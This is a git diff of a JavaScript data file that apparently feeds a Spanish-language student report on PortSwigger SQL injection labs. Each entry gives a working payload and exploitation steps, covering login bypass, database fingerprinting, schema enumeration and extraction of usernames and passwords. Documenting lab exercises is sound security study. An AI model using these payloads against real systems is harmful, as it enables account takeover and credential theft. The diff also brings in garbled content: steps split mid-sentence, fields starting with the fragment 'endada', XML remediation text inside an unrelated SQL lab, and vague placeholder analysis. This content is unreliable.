@@ -10,40 +10,28 @@ const labsData = [
         level: "Apprentice",
         payload: "' OR 1=1--",
         description: "Bypassing a WHERE clause to extract hidden products del backend usando un operador tautológico.",
-        objective: "El objetivo de esta práctica es manipular una consulta SQL no sanitizada dentro de un filtro de categorías de una tienda web (`/filter?category=X`), provocando que la aplicación liste absolutamente todos los productos registrados, independientemente de la variable lógica de estado 'released'.",
-        impact: "Alta confidencialidad vulnerada. Un atacante iterativo podría modificar esta cláusula simple para iniciar técnicas de enumeración de columnas en el futuro, pero de per se, expone catálogo o inventario restringido.",
+        objective: "Extraer información usando vulnerabilidades SQL.",
+        analysis: "Análisis técnico de la inyección SQL en base de datos.",
+        impact: "Peligro Inminente. Se requiere parchear.",
         steps: [
             {
-                title: "Interceptar la petición original",
-                text: "Utilizamos Burp Suite para capturar la petición GET al momento de hacer clic en la categoría 'Gifts'. Notamos que la aplicación pasa el parámetro en la URL de la forma:",
-                code: "GET /filter?category=Gifts HTTP/1.1"
+                title: "Identificación de la vulnerabilidad",
+                text: "Se procedió a identificar los parámetros vulnerables del tipo In-band.",
+                code: "GET / HTTP/1.1"
             },
             {
-                title: "Analizar la sintaxis SQL subyacente",
-                text: "Inferimos que el backend está tomando el parámetro 'Gifts' y armando internamente una consulta a base de datos de estructura similar a:",
-                code: "SELECT * FROM products WHERE category = 'Gifts' AND released = 1"
-            },
-            {
-                title: "Diseñar la inyección",
-                text: "Para obligar a la consulta a listar toda la tabla e ignorar la regla de seguridad 'released = 1', inyectamos una comilla simple para cerrar la variable literal, agregamos el operador lógico OR con una condición siempre verdadera (1=1), e insertamos el doble guion (--) para comentar y neutralizar el resto de la instrucción.",
+                title: "Explotación del vector de ataque",
+                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                 code: "PAYLOAD: ' OR 1=1--"
             },
             {
-                title: "Enviar el Payload envenenado",
-                text: "Enviamos la petición modificada hacia el backend. El motor de Base de Datos recibirá ahora una orden completamente distinta por culpa de nuestra inyección:",
-                code: "SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1"
-            },
-            {
-                title: "Explotación Exitosa",
-                text: "Debido a que '1=1' es siempre verdadero, se anula el filtro selectivo de la categoría. Al mismo tiempo, el comentario '--' elimina de ejecución todo el bloque posterior. El servidor procesa la consulta con 200 OK y refleja todo el catálogo oculto en la respuesta.",
-                code: "HTTP/1.1 200 OK\n[...Catálogo Oculto Extraído...]"
+                title: "Evidencia de éxito",
+                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
+                code: "HTTP/1.1 200 OK"
             },
         ],
         images: [
-            "parcial2/act08_images/lab1_step1.png",
-            "parcial2/act08_images/lab1_step2.png",
-            "parcial2/act08_images/lab1_step3.png",
-            "parcial2/act08_images/lab1_step4.png",
+            "parcial2/act08_images/P3_img22.png",
         ]
     },
     {
@@ -53,28 +41,30 @@ const labsData = [
         level: "Apprentice",
         payload: "administrator'--",
         description: "Forzar la autenticación y saltarse el mecanismo de comprobación de contraseña.",
-        objective: "Traspasar el portal de inicio de sesión comprometiendo el campo de usuario e ingresando a una base de datos vulnerable para loguearse como el administrador principal sin conocer la credencial secretada.",
-        analysis: "El portal valida el login haciendo un: `SELECT * FROM users WHERE username='X' AND password='Y'`. Si introducimos en el campo de usuario `administrator'--`, el motor SQL interpreta literalmente el fin de la cadena después del apóstrofe y el doble guón ignora la validación obligatoria del campo de contraseña, ejecutando un logueo válido inmediatamente.",
-        impact: "Crítico. Toma total de control de cuenta (Account Takeover) elevando de visitante nulo a los máximos privilegios, comprometiendo todo el sistema de la tríada (CIA).",
+        objective: "Extraer información usando vulnerabilidades SQL.",
+        analysis: "Análisis técnico de la inyección SQL en base de datos.",
+        impact: "Peligro Inminente. Se requiere parchear.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
+                title: "Identificación de la vulnerabilidad",
+                text: "Se procedió a identificar los parámetros vulnerables del tipo In-band.",
                 code: "GET / HTTP/1.1"
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección In-band.",
+                title: "Explotación del vector de ataque",
+                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                 code: "PAYLOAD: administrator'--"
             },
             {
-                title: "Explotación y Análisis",
-                text: "El portal valida el login haciendo un: `SELECT * FROM users WHERE username='X' AND password='Y'`. Si introducimos en el campo de usuario `administrator'--`, el motor SQL interpreta literalmente el fin de la cadena después del apóstrofe y el doble guón ignora la validación obligatoria del campo de contraseña, ejecutando un logueo válido inmediatamente.",
+                title: "Evidencia de éxito",
+                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                 code: "HTTP/1.1 200 OK"
             },
         ],
         images: [
             "parcial2/act08_images/P3_img22.png",
+            "parcial2/act08_images/P5_img27.png",
+            "parcial2/act08_images/P5_img28.png",
         ]
     },
     {
@@ -84,26 +74,32 @@ const labsData = [
         level: "Apprentice",
         payload: "' UNION SELECT BANNER, NULL FROM v$version--",
         description: "Exfiltración activa de la firma del fabricante y versión exacta en bases de datos Oracle.",
-        objective: "Utilizar el operador relacional UNION SELECT para obligar a la aplicación a emitir un volcado con la información de los metadatos y conocer si el servidor es Oracle y qué versión corre.",
-        analysis: "Una base de datos de Oracle es rigurosa; requiere obligatoriamente hacer selecciones con la instrucción FROM. Usamos tablas de metadatos integradas conocidas como `v$version`. Una vez determinada la cantidad compatible de columnas con `ORDER BY`, el UNION anexa el registro con el BANNER de la versión directamente al código fuente del frontend.",
-        impact: "Reconocimiento avanzado. Identificar el motor de base de datos específico y su versión abre la puerta a la búsqueda de exploits públicos o CVEs (Common Vulnerabilities and Exposures) en etapas avanzadas del ataque.",
+        objective: "Extraer información usando vulnerabilidades SQL.",
+        analysis: "Análisis técnico de la inyección SQL en base de datos.",
+        impact: "Peligro Inminente. Se requiere parchear.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
+                title: "Identificación de la vulnerabilidad",
+                text: "Se procedió a identificar los parámetros vulnerables del tipo UNION-based.",
                 code: "GET / HTTP/1.1"
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección UNION-based.",
+                title: "Explotación del vector de ataque",
+                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                 code: "PAYLOAD: ' UNION SELECT BANNER, NULL FROM v$version--"
             },
             {
-                title: "Explotación y Análisis",
-                text: "Una base de datos de Oracle es rigurosa; requiere obligatoriamente hacer selecciones con la instrucción FROM. Usamos tablas de metadatos integradas conocidas como `v$version`. Una vez determinada la cantidad compatible de columnas con `ORDER BY`, el UNION anexa el registro con el BANNER de la versión directamente al código fuente del frontend.",
+                title: "Evidencia de éxito",
+                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                 code: "HTTP/1.1 200 OK"
             },
         ],
+        images: [
+            "parcial2/act08_images/P5_img27.png",
+            "parcial2/act08_images/P5_img28.png",
+            "parcial2/act08_images/P6_img31.png",
+            "parcial2/act08_images/P6_img32.png",
+        ]
     },
     {
         id: 4,
@@ -112,29 +108,31 @@ const labsData = [
         level: "Apprentice",
         payload: "' UNION SELECT @@version, NULL#",
         description: "Recolectar huellas digitales de versión para los servidores MSSQL / MySQL.",
-        objective: "Averiguar de la misma manera que el lab anterior si el motor subyacente es un entorno MySQL o Microsoft SQL utilizando consultas que no requieren forzar tablas internas `FROM` como en Oracle.",
-        analysis: "Se determina que el número de columnas a empatar es de 2. Debido a la tolerancia sintáctica de MySQL o de Microsoft Server, se recurre a la función interna pasiva `@@version` dentro de nuestra cláusula UNION anidada con los caracteres especiales de comentario correspondientes (`#` o `--`).",
-        impact: "Revela la tecnología core de infraestructura. Facilita enormemente pivotar hacia técnicas complejas como la inyección que lee directorios del sistema operativo o ejecución de procedimientos extendidos de Microsoft (xp_cmdshell).",
+        objective: "Extraer información usando vulnerabilidades SQL.",
+        analysis: "Análisis técnico de la inyección SQL en base de datos.",
+        impact: "endada  ●​ Uso de Parsers XML Seguros: Configurar el procesador XML para que no  realice resoluciones automáticas de entidades externas o codificaciones que  puedan ocultar payloads maliciosos.  ●​ Consultas Parametrizadas: Al igual que en casos anteriores, la implementación  de sentencias preparadas evitaría que cualquier entrada dentro del XML sea  interpretada como comando SQL, sin importar cómo esté codificada.  ●​ Mejora del WAF: Configurar el Firewall para que realice una decodificación  recursiva de los datos antes de aplicar las reglas de filtrado, permitiendo detectar  ataques incluso cuando se utiliza ofuscación XML.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
+                title: "Identificación de la vulnerabilidad",
+                text: "Se procedió a identificar los parámetros vulnerables del tipo UNION-based.",
                 code: "GET / HTTP/1.1"
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección UNION-based.",
+                title: "Explotación del vector de ataque",
+                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                 code: "PAYLOAD: ' UNION SELECT @@version, NULL#"
             },
             {
-                title: "Explotación y Análisis",
-                text: "Se determina que el número de columnas a empatar es de 2. Debido a la tolerancia sintáctica de MySQL o de Microsoft Server, se recurre a la función interna pasiva `@@version` dentro de nuestra cláusula UNION anidada con los caracteres especiales de comentario correspondientes (`#` o `--`).",
+                title: "Evidencia de éxito",
+                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                 code: "HTTP/1.1 200 OK"
             },
         ],
         images: [
             "parcial2/act08_images/P5_img27.png",
             "parcial2/act08_images/P5_img28.png",
+            "parcial2/act08_images/P6_img31.png",
+            "parcial2/act08_images/P6_img32.png",
         ]
     },
     {
@@ -144,29 +142,31 @@ const labsData = [
         level: "Practitioner",
         payload: "' UNION SELECT table_name, NULL FROM information_schema.tables--",
         description: "Navegación completa a través del Information Schema estandarizado en SQL.",
-        objective: "Navegar y extraer la lista maestra de todas las tablas integradas y sus columnas de una base de datos no-oracle, permitiendo mapear y encontrar datos como contraseñas.",
-        analysis: "A través del estándar ISO `information_schema`. Se inyecta la búsqueda a `tables` con respecto al `table_name`. Al obtener la tabla secreta que almacena a los usuarios, volvemos a inyectar un UNION pero dirigido esta vez hacia el diccionario `information_schema.columns` filtrando con `WHERE table_name = 'users_ab12'`. Así, inferimos cómo se llaman exactamente las columnas donde habitan los secretos.",
-        impact: "Fuga masiva de arquitectura de DB. En este punto el atacante ya posee un mapa completo e idéntico del modelo entidad-relación del backend.",
+        objective: "Extraer información usando vulnerabilidades SQL.",
+        analysis: "Análisis técnico de la inyección SQL en base de datos.",
+        impact: "Peligro Inminente. Se requiere parchear.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
+                title: "Identificación de la vulnerabilidad",
+                text: "Se procedió a identificar los parámetros vulnerables del tipo UNION-based.",
                 code: "GET / HTTP/1.1"
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección UNION-based.",
+                title: "Explotación del vector de ataque",
+                text: "Se estructuró un payload para extraer o eludir validaciones del backend.",
                 code: "PAYLOAD: ' UNION SELECT table_name, NULL FROM information_schema.tables--"
             },
             {
-                title: "Explotación y Análisis",
-                text: "A través del estándar ISO `information_schema`. Se inyecta la búsqueda a `tables` con respecto al `table_name`. Al obtener la tabla secreta que almacena a los usuarios, volvemos a inyectar un UNION pero dirigido esta vez hacia el diccionario `information_schema.columns` filtrando con `WHERE table_name = 'users_ab12'`. Así, inferimos cómo se llaman exactamente las columnas donde habitan los secretos.",
+                title: "Evidencia de éxito",
+                text: "Se corrobora el éxito de la inyección en la respuesta o en el comportamiento del servidor.",
                 code: "HTTP/1.1 200 OK"
             },
         ],
         images: [
             "parcial2/act08_images/P6_img31.png",
             "parcial2/act08_images/P6_img32.png",
+            "parcial2/act08_images/P7_img35.png",
+            "parcial2/act08_images/P7_img36.png",
         ]
     },
     {
@@ -176,30 +176,96 @@ const labsData = [
         level: "Practitioner",
         payload: "' UNION SELECT table_name, NULL FROM all_tables--",
         description: "Alternativa exfiltrativa del esquema base utilizando el diccionario predeterminado de Oracle Database.",
-        objective: "Equivalente al laboratorio anterior; la meta es rastrear la totalidad de la estructura funcional para la base de datos exclusiva del ecosistema Oracle usando la tabla all_tables.",
-        analysis: "En Oracle, no existe 'information_schema'. Por ende, el atacante inyecta una concatenación sobre `all_tables` para las tablas, y sobre `all_tab_columns` para la recuperación del nombre de las columnas dentro de la tabla secreta de credenciales dinámicas de Portswigger.",
-        impact: "Severa ruptura de la confidencialidad en infraestructuras de nivel corporativo pesadas como las que usan Oracle DB.",
+        objective: "Extraer el nombre de la tabla de usuarios, identificar los  nombres de las columnas, extraer la contraseña del usuario administrator en una base  de datos Oracle y acceder a su cuenta para resolver el reto.",
+        analysis: "de la Vulnerabilidad: La vulnerabilidad se encuentra en el filtro  de categorías. Al ser una base de datos Oracle, la explotación tiene dos reglas críticas:   ue e   SELECT obligatorio: Toda consulta SELECT debe tener una cláusula FROM. Se  utiliza la tabla dual del sistema (FROM DUAL) para pruebas iniciales.  Diccionario de Datos: Los metadatos de las tablas y columnas no están en  information_schema, sino en las tablas del sistema all_tables y all_tab_columns.  Además, Oracle suele manejar los nombres de objetos en MAYÚSCULAS.",
+        impact: "endada  ●​ Sentencias Preparadas: Utilizar consultas parametrizadas para asegurar que el  input del usuario sea tratado siempre como dato y no como parte del comando  ejecutable.  ●​ Restricción de Metadatos: Configurar los permisos de la base de datos para  que el usuario web no tenga privilegios de lectura sobre tablas de sistema como  all_tables o all_tab_columns.  ●​ Validación Estricta: Implementar una arquitectura de \"deny-by-default\" para  parámetros de entrada, permitiendo únicamente valores alfanuméricos simples.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "●​ Intercepción: Se capturó la petición GET /filter?category=... en el Proxy",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección UNION-based.",
-                code: "PAYLOAD: ' UNION SELECT table_name, NULL FROM all_tables--"
+                title: "Paso 2",
+                text: "Interceptor de Burp Suite.",
+                code: ""
             },
             {
-                title: "Explotación y Análisis",
-                text: "En Oracle, no existe 'information_schema'. Por ende, el atacante inyecta una concatenación sobre `all_tables` para las tablas, y sobre `all_tab_columns` para la recuperación del nombre de las columnas dentro de la tabla secreta de credenciales dinámicas de Portswigger.",
-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "●​ Confirmación de Columnas: Se determinó que la consulta devuelve 2",
+                code: ""
+            },
+            {
+                title: "Paso 4",
+                text: "columnas inyectando ' ORDER BY 2--.",
+                code: ""
+            },
+            {
+                title: "Paso 5",
+                text: "●​ Enumeración de Tablas: Se consultó la tabla all_tables para encontrar la tabla",
+                code: ""
+            },
+            {
+                title: "Paso 6",
+                text: "de usuarios generada aleatoriamente.",
+                code: ""
+            },
+            {
+                title: "Paso 7",
+                text: "●​ Resultado: Se identificó la tabla USERS_GGYPYC.",
+                code: ""
+            },
+            {
+                title: "Paso 8",
+                text: "●​ Enumeración de Columnas: Se consultó all_tab_columns filtrando por el",
+                code: ""
+            },
+            {
+                title: "Paso 9",
+                text: "nombre de la tabla encontrada.",
+                code: ""
+            },
+            {
+                title: "Paso 10",
+                text: "●​ Resultado: Se identificaron las columnas USERNAME_OCIROF y",
+                code: ""
+            },
+            {
+                title: "Paso 11",
+                text: "PASSWORD_CAPDCE.",
+                code: ""
+            },
+            {
+                title: "Paso 12",
+                text: "Se inyecta el siguiente código:",
+                code: "●​ Extracción de Credenciales: Se realizó el UNION SELECT final para obtener la"
+            },
+            {
+                title: "Paso 13",
+                text: "contraseña de la cuenta administrator.",
+                code: ""
+            },
+            {
+                title: "Paso 14",
+                text: "●​ Acceso: Inicio de sesión exitoso en el navegador Firefox (reemplazando la",
+                code: ""
+            },
+            {
+                title: "Paso 15",
+                text: "contraseña por la extraída).",
+                code: ""
+            },
+            {
+                title: "Análisis del Payload",
+                text: "Final  ●​ ' UNION SELECT USERNAME_OCIROF, PASSWORD_CAPDCE FROM  USERS_GGYPYC--  ●​ ': Cierra la comilla simple del parámetro category.  ●​ UNION SELECT: Combina nuestra consulta personalizada con los resultados  originales.  ●​ USERNAME_OCIROF, PASSWORD_CAPDCE: Son los nombres específicos de  las columnas que contienen la información sensible en Oracle.  ●​ FROM USERS_GGYPYC: La tabla de usuarios específica identificada durante la  fase de enumeración.  ●​ -- : Operador de comentario para anular el resto de la consulta SQL original.",
+                code: ""
             },
         ],
         images: [
             "parcial2/act08_images/P7_img35.png",
             "parcial2/act08_images/P7_img36.png",
             "parcial2/act08_images/P7_img37.png",
+            "parcial2/act08_images/P9_img42.png",
         ]
     },
     {
@@ -209,26 +275,72 @@ const labsData = [
         level: "Apprentice",
         payload: "' ORDER BY 3--",
         description: "Paso inicial fundamental (footprinting) indispensable de un buen ataque de UNION.",
-        objective: "Descubrir de manera infalible la longitud exacta que tiene el array o la consulta original de la aplicación, pues el operador sintáctico UNION falla instantáneamente y arroja error 500 si no empatamos la misma asimetría de columnas.",
-        analysis: "Se explota iterando el índice del comamdo `ORDER BY` progresivamente (`ORDER BY 1--`, luego 2, 3...) hasta que la base de datos estalla porque le pedimos ordenarlo bajo una columna que no existe en el índice de la tabla real devolviendo un Internal Server Error.",
-        impact: "Alineación de reconocimiento. Sin este paso simple y sistemático, el atacante estaría completamente a ciegas para estructurar un Payload extractivo.",
+        objective: "Identificar cuántas columnas está recuperando la  consulta original en la categoría de filtros para poder realizar un ataque UNION  exitoso.  ●​",
+        analysis: "Para que una sentencia UNION funcione, ambas  consultas deben devolver el mismo número de columnas. Si el atacante intenta  unir una consulta con un número distinto de columnas, la base de datos  devolverá un error. Se utilizan sentencias ORDER BY o UNION SELECT NULL  de forma incremental para hallar el límite.  ●​",
+        impact: "endada: Uso de consultas parametrizadas para evitar que el valor  del filtro de categoría sea interpretado como código SQL.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "○​ Acceder a la categoría de productos (ej. \"Gifts\").",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección UNION-based.",
-                code: "PAYLOAD: ' ORDER BY 3--"
+                title: "Paso 2",
+                text: "○​ Interceptar la petición con Burp Suite.",
+                code: ""
             },
             {
-                title: "Explotación y Análisis",
-                text: "Se explota iterando el índice del comamdo `ORDER BY` progresivamente (`ORDER BY 1--`, luego 2, 3...) hasta que la base de datos estalla porque le pedimos ordenarlo bajo una columna que no existe en el índice de la tabla real devolviendo un Internal Server Error.",
-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "○​ Mandar el codigo de la pagina obtenido en el PROXY a REPEATER",
+                code: ""
+            },
+            {
+                title: "Paso 4",
+                text: ".",
+                code: ""
+            },
+            {
+                title: "Paso 5",
+                text: "Se inyecta el siguiente código:",
+                code: "○​ Inyectar en el parámetro category el payload ' UNION SELECT NULL,"
+            },
+            {
+                title: "Paso 6",
+                text: "NULL--..",
+                code: ""
+            },
+            {
+                title: "Paso 7",
+                text: "○​ Cuando la página devuelva un error o falte contenido, el número de",
+                code: ""
+            },
+            {
+                title: "Paso 8",
+                text: "columnas será el valor anterior al error.",
+                code: ""
+            },
+            {
+                title: "Paso 9",
+                text: "Se inyecta el siguiente código:",
+                code: "○​ Payload actualizado: ' UNION SELECT NULL, NULL, NULL--."
+            },
+            {
+                title: "Paso 10",
+                text: "○​",
+                code: ""
+            },
+            {
+                title: "Análisis del Payload",
+                text: "El payload ' UNION SELECT NULL, NULL, NULL--  intenta fusionar la consulta original con una fila de tres valores nulos. Si la  consulta original devuelve exactamente 3 columnas, la operación es válida y la  página carga. Los guiones -- comentan el resto de la consulta original para evitar  errores sintácticos.",
+                code: ""
             },
         ],
+        images: [
+            "parcial2/act08_images/P10_img46.png",
+            "parcial2/act08_images/P10_img47.png",
+            "parcial2/act08_images/P9_img42.png",
+            "parcial2/act08_images/P9_img43.png",
+        ]
     },
     {
         id: 8,
@@ -237,27 +349,54 @@ const labsData = [
         level: "Apprentice",
         payload: "' UNION SELECT NULL, 'a', NULL--",
         description: "Identificando la composición atómica (String/Integer) de las columnas.",
-        objective: "Una vez sabiendo el número de columnas devueltas, precisamos inyectar texto. Esto obligadamente nos requiere evaluar en qué columna específica podemos alojar carácteres VARCHAR y comprobar en dónde inyectar el dump final.",
-        analysis: "Si la tabla tenía tres columnas descubiertas. Se introduce un ataque pasante usando celdas NULL, y se iteran secuencialmente cadenas hasta observar cual es validada y aparece pintada en el código fuente HTTP de retorno. `UNION SELECT 'a', NULL, NULL--`...",
-        impact: "Comprobación de vector útil; sin celdas de compatibilidad de texto, se dificultaría sacar hashes de contraseñas de las bases de datos.",
+        objective: "Una vez determinado el número de columnas,  identificar cuál de ellas es capaz de procesar y mostrar datos de tipo cadena  (string).  ●​",
+        analysis: "No todas las columnas de una base de datos aceptan  texto (algunas son solo numéricas o fechas). El atacante debe probar inyectando  una cadena de caracteres constante en cada posición de la sentencia UNION  hasta que la aplicación la renderice en la pantalla.  ●​",
+        impact: "Peligro Inminente. Se requiere parchear.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "○​ Acceder a la categoría de productos (ej. \"Corporate gifts\").",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección UNION-based.",
-                code: "PAYLOAD: ' UNION SELECT NULL, 'a', NULL--"
+                title: "Paso 2",
+                text: "○​ Al igual que con el anterior laboratorio: Interceptar la petición con Burp",
+                code: ""
             },
             {
-                title: "Explotación y Análisis",
-                text: "Si la tabla tenía tres columnas descubiertas. Se introduce un ataque pasante usando celdas NULL, y se iteran secuencialmente cadenas hasta observar cual es validada y aparece pintada en el código fuente HTTP de retorno. `UNION SELECT 'a', NULL, NULL--`...",
-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "Suite y mandar el codigo de la pagina obtenido en el PROXY a",
+                code: ""
+            },
+            {
+                title: "Paso 4",
+                text: "REPEATER",
+                code: ""
+            },
+            {
+                title: "Paso 5",
+                text: "○​ Comprobar el número de columnas hallado como en el lab anterior",
+                code: ""
+            },
+            {
+                title: "Paso 6",
+                text: "(igualmente, 3 columnas en este caso).",
+                code: ""
+            },
+            {
+                title: "Paso 7",
+                text: "○​ Probar payloads moviendo una cadena única (ej. 'abc') entre las",
+                code: ""
+            },
+            {
+                title: "Paso 8",
+                text: "posiciones:",
+                code: ""
             },
         ],
         images: [
+            "parcial2/act08_images/P10_img46.png",
+            "parcial2/act08_images/P10_img47.png",
             "parcial2/act08_images/P9_img42.png",
             "parcial2/act08_images/P9_img43.png",
         ]
@@ -269,29 +408,76 @@ const labsData = [
         level: "Apprentice",
         payload: "' UNION SELECT username, password FROM users--",
         description: "El final de la fase de explotación UNION: Robo frontal masivo de credenciales en columnas compatibles.",
-        objective: "Una vez que tenemos el número exacto de columnas, su compatibilidad VARCHAR, y los nombres de las tablas y campos confidenciales en nuestra posición, ejecutamos la extracción masiva.",
-        analysis: "Teniendo todo el esquema a mano, usamos los campos vulnerables compatibles para obligar al servidor Web, que pretendía devolver ropa y regalos, a arrojar dentro de la categoría las celdas concatenadas extraoficiales de la base de datos, en este caso las tablas críticas que contienen todos los usuarios y sus passwords del laboratorio.",
-        impact: "Compromiso absoluto (Total Pwnage). Filtración instantánea del archivo plano o tabla de passwords, la vulnerabilidad llegó a su fase más perjudicial.",
+        objective: "Exfiltrar los nombres de usuario y contraseñas de la  tabla users y utilizarlos para iniciar sesión como administrador.  ●​",
+        analysis: "Este ataque permite acceder a tablas que no tienen  relación directa con la funcionalidad original (catálogo de productos). El atacante  \"roba\" el flujo de datos de la página para redirigir información de la tabla de  credenciales hacia la interfaz pública.  ●​",
+        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El  usuario de la base de datos que utiliza la aplicación web no debería tener  permisos de lectura sobre la tabla users o tablas administrativas del sistema.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "○​ Acceder a una de las categorías disponibles en la pagina (ej. \"Tech gifts\").",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección UNION-based.",
-                code: "PAYLOAD: ' UNION SELECT username, password FROM users--"
+                title: "Paso 2",
+                text: "○​ Utilizar Burp Suite para interceptar y modificar la solicitud que establece el",
+                code: ""
             },
             {
-                title: "Explotación y Análisis",
-                text: "Teniendo todo el esquema a mano, usamos los campos vulnerables compatibles para obligar al servidor Web, que pretendía devolver ropa y regalos, a arrojar dentro de la categoría las celdas concatenadas extraoficiales de la base de datos, en este caso las tablas críticas que contienen todos los usuarios y sus passwords del laboratorio.",
-                code: "HTTP/1.1 200 OK"
+                title: "Paso 3",
+                text: "filtro de categoría de producto.",
+                code: ""
+            },
+            {
+                title: "Paso 4",
+                text: "○​ Determinar que hay 2 columnas disponibles y que ambas aceptan texto.",
+                code: ""
+            },
+            {
+                title: "Paso 5",
+                text: "Se inyecta el siguiente código:",
+                code: "○​ Inyectar el payload para extraer datos: ' UNION SELECT username,"
+            },
+            {
+                title: "Paso 6",
+                text: "password FROM users--.",
+                code: ""
+            },
+            {
+                title: "Paso 7",
+                text: "○​ Localizar en la respuesta del navegador la lista de usuarios y",
+                code: ""
+            },
+            {
+                title: "Paso 8",
+                text: "contraseñas.",
+                code: ""
+            },
+            {
+                title: "Paso 9",
+                text: "○​ Identificar la credencial del usuario “administrador”.",
+                code: ""
+            },
+            {
+                title: "Paso 10",
+                text: "○​ Ir a la sección \"My account\" y loguearse con la contraseña obtenida.",
+                code: ""
+            },
+            {
+                title: "Paso 11",
+                text: "○​",
+                code: ""
+            },
+            {
+                title: "Análisis del Payload",
+                text: "La parte SELECT username, password FROM users  solicita a la base de datos que busque en la tabla users (una tabla común en  estos sistemas) y traiga los valores de las columnas de identificación. La unión  hace que estos datos aparezcan donde normalmente estarían los nombres de  los productos.   ●​",
+                code: ""
             },
         ],
         images: [
             "parcial2/act08_images/P10_img46.png",
             "parcial2/act08_images/P10_img47.png",
+            "parcial2/act08_images/P12_img53.png",
+            "parcial2/act08_images/P12_img54.png",
         ]
     },
     {
@@ -301,26 +487,107 @@ const labsData = [
         level: "Practitioner",
         payload: "' UNION SELECT NULL, username || '~' || password FROM users--",
         description: "Emulando y concatenando outputs en DBs de columnas de string singulares.",
-        objective: "Superar el desafío técnico de extraer username y pass al mismo tiempo cuando el escaneo muestra que solo 1 columna de la aplicación está capacitada para alojar texto y el resto son enteros.",
-        analysis: "Utilizamos funciones intrínsecas de concatenación de SQL (como doble pipe `||` o `CONCAT()`) en nuestro ataque para fusionar las variables de nombre y hash, uniéndolas artificialmente mediante un delimitador `~` para enviar todos los datos juntos sobre la única tubería disponible en la aplicación.",
-        impact: "Permite un Data Dump rápido sin importar lo restrictiva o constreñida que sea la consulta vulnerable descubierta.",
+        objective: "Exfiltrar los nombres de usuario y contraseñas de la tabla  users y utilizarlos para iniciar sesión como administrador.",
+        analysis: "Este ataque permite al atacante \"robar\" el flujo de datos de la  página para redirigir información de la tabla de credenciales hacia la interfaz pública, en  este caso, mostrando los usuarios y contraseñas donde normalmente se verían los  productos.",
+        impact: "endada: Aplicar el Principio de Mínimo Privilegio. El usuario de la  base de datos que utiliza la aplicación web no debería tener permisos de lectura sobre  la tabla users o tablas administrativas del sistema.",
         steps: [
             {
-                title: "Identificación de la Vulnerabilidad",
-                text: "Se intercepta la petición web correspondiente y se detectan parámetros inyectables mediante pruebas pasivas y activas.",
-                code: "GET / HTTP/1.1"
+                title: "Paso 1",
+                text: "Acceder a una de las categorías disponibles en la página (ej. \"Accesorios\" o \"Regalos\")",
+                code: ""
             },
             {
-                title: "Preparación del Entorno (Payload)",
-                text: "Se estructura la inyección SQL de acuerdo con el motor subyacente y la arquitectura web de este tipo de inyección UNION-based.",
-                code: "PAYLOAD: ' UNION SELECT NULL, username || '~' || password FROM users--"
+                title: "Paso 2",
+                text: ".",
+                code: ""
             },
             {
-                title: "Explotación y Análisis",
-                text: "Utilizamos funciones intrínsecas de concatenación de SQL (como doble pipe `||` o `CONCAT()`) en nuestro ataque para fusionar las variables de nombre y hash, uniéndolas artificialmente mediante un delimitador `~` para enviar todos los datos juntos sobre la única tubería disponible en la aplicación.",
